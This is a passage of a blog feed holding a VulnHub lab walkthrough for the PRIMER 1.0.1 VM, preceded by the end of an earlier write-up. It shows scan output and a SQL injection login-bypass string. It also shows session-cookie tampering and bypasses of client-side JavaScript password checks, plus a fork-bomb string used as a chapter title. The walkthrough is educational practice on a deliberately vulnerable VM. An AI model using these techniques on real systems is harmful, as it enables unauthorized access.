</span><span class='line'>  E#,    :        f#i                        .Gt  t    j.       &lt;br/&gt;
</span><span class='line'>  E#t  .GE      .E#t                        j#W:  Ej   EW,      &lt;br/&gt;
</span><span class='line'>  E#t j#K<span class="p">;</span>     i#W,     t      .DD.       <span class="p">;</span>K#f    E#,  E##j     &lt;br/&gt;
</span><span class='line'>  E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.   &lt;br/&gt;
</span><span class='line'>  E##D.     :K#Wfff<span class="p">;</span>    E#t  i#D       j#K<span class="p">;</span>       E#t  E#jG#W<span class="p">;</span>  &lt;br/&gt;
</span><span class='line'>  E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD<span class="p">;</span>  E#t  E#t t##f &lt;br/&gt;
</span><span class='line'>  E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E:
</span><span class='line'>  E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i
</span><span class='line'>  E#t   jD      ,WW<span class="p">;</span>    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,
</span><span class='line'>  j#t            .D#<span class="p">;</span>   ED.                j###t  E#t  E#t  <span class="p">;</span><span class="c">#W:&lt;br/&gt;</span>
</span><span class='line'>   ,<span class="p">;</span>              tt   t                   .G#t  E#t  DWi   ,KK:
</span><span class='line'>                                              <span class="p">;;</span>  ,<span class="p">;</span>.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                                               by canyoupwn.me
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#x61;&amp;#100;&amp;#109;&amp;#105;&amp;#110;&amp;#64;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#50;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Permission denied, please try again.
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x61;&amp;#100;&amp;#109;&amp;#x69;&amp;#110;&amp;#x40;&amp;#x31;&amp;#48;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#109;&amp;#x69;&amp;#110;&amp;#x40;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#49;&amp;#46;&amp;#x31;&amp;#x32;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  System information as of Sat May <span class="m">28</span> 15:45:06 EEST 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  System load:  0.0               Processes:           174
</span><span class='line'>  Usage of /:   32.5% of 6.50GB   Users logged in:     1
</span><span class='line'>  Memory usage: 30%               IP address <span class="k">for</span> eth0: 10.1.1.128
</span><span class='line'>  Swap usage:   0%&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  Graph this data and manage this system at:
</span><span class='line'>    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com/&quot;</span>&gt;https://landscape.canonical.com/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;151 packages can be updated.
</span><span class='line'><span class="m">79</span> updates are security updates.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Last login: Sat May <span class="m">28</span> 15:44:57 <span class="m">2016</span> from 10.1.1.130
</span><span class='line'>admin@canyoupwnme:~<span class="nv">$ </span><span class="nb">exit</span>
</span><span class='line'><span class="nb">logout</span>
</span><span class='line'>Connection to 10.1.1.128 closed.
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I can login as admin!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] PRIMER:1.0.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/04/12/vulnhub-primer-1-dot-0-1/"/>
    <updated>2016-04-12T22:43:27+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/04/12/vulnhub-primer-1-dot-0-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and responsibility.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/arne-rick,217/">Arne Rick(@couchsofa)</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/primer-101,136/">here</a> or <a href="http://wiki.fablab-karlsruhe.de/doku.php?id=projekte:primer">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: PRIMER: 1.0.1 (<em>10.1.1.151/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<p>There is no acutal Vulnerabilities (except a simple SQL injection), all you need to do to take down this VM is Enumeration and more enumberation.</p>

<ul>
<li>Checking source code / comments</li>
<li>Enumeration, Enumeration and more Enumeration</li>
<li>Puzzle cracking</li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.151  00:0c:29:ad:7e:f2   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f4:51:9f   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.859 seconds <span class="o">(</span>89.54 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.151</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.151/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-01-22 23:48:47 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.151                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.151                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.151                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 33786/tcp on 10.1.1.151&lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Fri Jan <span class="m">22</span> 18:50:28 <span class="m">2016</span> as: nmap -sV -A -O -p 22,80,111,33786 -v -oN 10.1.1.151_nmap.txt 10.1.1.151&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.151
</span><span class='line'>Host is up <span class="o">(</span>0.00077s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 01:2e:60:5f:99:48:3b:2f:c0:72:c6:ae:48:02:5e:33 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ed:26:be:cc:c6:2a:93:d1:e1:6d:0d:5a:53:7b:4d:fb <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> 7f:4e:64:a0:c4:8a:13:8e:e9:86:3d:5d:49:04:c4:54 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
</span><span class='line'><span class="p">|</span>&lt;em&gt;/4_8f14e45fceea167a5a36dedd4bea2543
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: PRIMER
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          33786/tcp  status
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          36908/udp  status
</span><span class='line'>33786/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          33786/tcp  status
</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          36908/udp  status
</span><span class='line'>MAC Address: 00:0C:29:AD:7E:F2 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.001 days <span class="o">(</span>since Fri Jan <span class="m">22</span> 18:49:50 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">261</span> <span class="o">(</span>Good luck!<span class="o">)</span>
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.77 ms 10.1.1.151&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/submit/&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap <span class="k">done</span> at Fri Jan <span class="m">22</span> 18:50:44 <span class="m">2016</span> <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.87 seconds&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Four ports are found: <code>22, 80, 111, 33786</code> and a hidden folder <code>/4_8f14e45fceea167a5a36dedd4bea2543</code> is found in <code>robots.txt</code>.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80 found by port-scanning stage.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.151
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x16ef 0x522ed6bcd00c0
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/4_8f14e45fceea167a5a36dedd4bea2543/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET <span class="p">&amp;</span>ldquo<span class="p">;</span>robots.txt<span class="p">&amp;</span>rdquo<span class="p">;</span> contains <span class="m">1</span> entry which should be manually viewed.
</span><span class='line'>+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-ob_mode<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: 0
</span><span class='line'>+ OSVDB-3092: GET /manual/: Web server manual found.
</span><span class='line'>+ OSVDB-3268: GET /manual/images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure></p>

<p>This result approved the finding from NMAP scan and also found a new folder <code>/phpmyadmin/</code>.</p>

<p>Now open firefox to check the WEB application.</p>

<p><img class="left" src="/downloads/primer101/1.png"></p>

<h3>Part 1: [PRIMER]</h3>

<h4>charpter 1: [<strong>init</strong>]</h4>

<p>On the first page, here is a login form. After playing with this page for a while such as checking source code, try weak passwords&hellip; but nothing found.
I decided to test some basic SQL injection, and it is vulnerable!</p>

<p>type the following in username and any rubbish in password, and then submit the form to bypass the login.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">Username</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> <span class="p">&amp;</span>ndash<span class="p">;</span> -
</span><span class='line'><span class="nv">Password</span> <span class="o">=</span> xxxxxx
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/primer101/2.png"></p>

<h4>chapter 2: [(=)&lt;=>(&lt;=>)]</h4>

<p>By checking the source code, I noticed the following comments:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- This bot was looking <span class="k">for</span> a Sos User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 <span class="nb">hash </span>of the first <span class="m">7</span> digits of pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security. --&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><font color="red"><strong>[note!!]</strong></font> However, here should be the md5 hash value of the first digit of pi&hellip;</p>

<p><code>md5(3) = eccbc87e4b5ce2fe28308fd9f2a7baf3</code></p>

<p>So the next level should be <code>2_eccbc87e4b5ce2fe28308fd9f2a7baf3</code></p>

<p><img class="left" src="/downloads/primer101/3.png"></p>

<h4>chapter 3: [&ldquo;[^&rdquo;\r\n]*&ldquo;]</h4>

<p>By checking the source code, I found there is another file <code>style.css</code>. and the hint just hidden in its source code.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/&lt;em&gt;Clean sessions terminate without leaving things behind. Some are cleaner than others and some are really dirty to begin with. &lt;/em&gt;Programming is an art form, even in the age of the n3t people still make mistakes. &lt;em&gt;Sometimes, an exploit is as simple as changing a simple value in a <span class="nb">local </span>file. &lt;/em&gt;Piece of cake! */
</span></code></pre></td></tr></table></div></figure></p>

<p><code>simple value in a local file</code>, well the first thing need to be check is the cookie!</p>

<p><img class="left" src="/downloads/primer101/4.png"></p>

<p>The sessoin cookie&rsquo;s value <code>activeSession</code> is <code>false</code>. Let&rsquo;s change it to <code>true</code> and refresh the page. and bingo~~</p>

<p><img class="left" src="/downloads/primer101/5.png"></p>

<h4>Chapter 4: [:(){ :|:&amp;};:]</h4>

<p>This one has been found in nmap scanning phrase, which is found in robots.txt file.</p>

<p><code>http://10.1.1.151/4_8f14e45fceea167a5a36dedd4bea2543/</code></p>

<p><img class="left" src="/downloads/primer101/6.png"></p>

<h3>Part 2: [FORK]</h3>

<p>nothing interesting, click <code>EOF</code> will send me to another layer/page:</p>

<p><code>http://10.1.1.151/5_6512bd43d9caa6e02c990b0a82652dca/</code></p>

<p><img class="left" src="/downloads/primer101/7.png"></p>

<h4>Chapter 5: [0xC00007B]</h4>

<p>Well, the answer is obvious that <code>/6_c51ce410c124a10e0db5e4b97fc2af39</code>. So keep moving on:</p>

<p><img class="left" src="/downloads/primer101/8.png"></p>

<p>Here is interesting, Burp proxy and wireshark could not catch anything when I visit <code>http://10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/</code> when I got the password window pop up.</p>

<p>So I try to use curl to check what exactly happened.</p>

<p>based on the respond from the server, I noticed the following javascript code:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">root</span><span class="err">@</span><span class="nx">kali</span><span class="o">:~</span><span class="err">#</span> <span class="nx">curl</span> <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/&quot;</span><span class="o">&gt;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/&lt;/a&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">turncate</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;JavaScript&quot;</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">X</span><span class="p">;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="s2">&quot;Ikdf076&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;/()=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">X</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">X</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="nx">L</span><span class="p">){}</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span><span class='line'><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">turncate</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>analyzed the script, we know that the password is any string which include the pattern <code>Ikdf076</code> since the third latter. such as <code>xxIkdf076xxxx</code>.</p>

<p>So I entered <code>12Ikdf076</code> to bypass the login window and got the next level&rsquo;s entry: <code>7_70efdf2ec9b086079795c442636b55fb</code>.</p>

<p><img class="left" src="/downloads/primer101/9.png"></p>

<h4>Chapter 6: [++Q++++++]</h4>

<p>Now let&rsquo;s move to next level, another input window pop up&hellip;</p>

<p><img class="left" src="/downloads/primer101/10.png"></p>

<p>Use <code>curl</code> again and from the responded source code, I found the following hints:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">turncate</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="err">/&lt;em&gt;&amp;ldquo;Someone didn&amp;rsquo;t bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and&amp;hellip;&amp;rdquo; - The Plague&lt;/em&gt;/</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">turncate</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>and</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">turncate</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span><span class="kd">var</span> <span class="nx">L</span><span class="o">=&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="mh">0x5cf4</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="o">&lt;</span><span class="err">/em&gt;0x5cf4[10],&lt;em&gt;0x5cf4[0]);X=md5(X);if(X===null){window[&lt;/em&gt;0x5cf4[11]]=&lt;em&gt;0x5cf4[12]};if(X==L){}else {window[&lt;/em&gt;0x5cf4[11]]=_0x5cf4[12]};</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">turncate</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the comments above, If you have watched the movie <code>Hackers</code> published in 1995, you will know the 4th most-used password here is <code>god</code> :P</p>

<p>From the source code, here we know that <code>X</code> is the md5 value of my input and if <code>X</code> equal to <code>L</code> then the typed password is correct. so we can crack <code>L</code> to get the password.</p>

